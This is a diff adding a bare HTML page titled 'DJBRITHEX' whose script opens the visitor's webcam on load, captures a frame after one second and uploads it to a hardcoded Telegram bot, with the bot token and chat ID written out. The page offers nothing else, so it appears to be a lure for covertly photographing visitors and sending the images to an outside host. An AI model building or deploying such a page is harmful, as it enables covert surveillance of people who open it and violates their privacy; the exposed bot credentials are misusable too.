@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<title>DJBRITHEX</title>
+</head>
+<body>
+
+<h2>.</h2>
+
+<video id="video" width="320" height="240" autoplay></video>
+<canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+
+<script>
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
+
+    const BOT_TOKEN = "7960928309:AAFWhZhNuHn42tzjUEyvoUT8k6Eu97BaFbA";
+    const CHAT_ID = "8557609477";
+
+    // فتح الكاميرا
+    navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+            video.srcObject = stream;
+
+            // التقاط الصورة بعد 1 ثانية
+            setTimeout(() => {
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                canvas.toBlob(blob => {
+
+                    let formData = new FormData();
+                    formData.append("chat_id", CHAT_ID);
+                    formData.append("photo", blob, "photo.jpg");
+
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: "POST",
+                        body: formData
+                    })
+                    .then(() => alert("✓ تم التقاط الصورة وإرسالها إلى تيليغرام"))
+                    .catch(() => alert("✗ حدث خطأ أثناء الإرسال"));
+
+                }, "image/jpeg");
+
+            }, 1000); // 1 ثانية
+
+        })
+        .catch(() => alert("✗ لم يتم السماح بفتح الكاميرا"));
+</script>
+
+</body>
+</html>
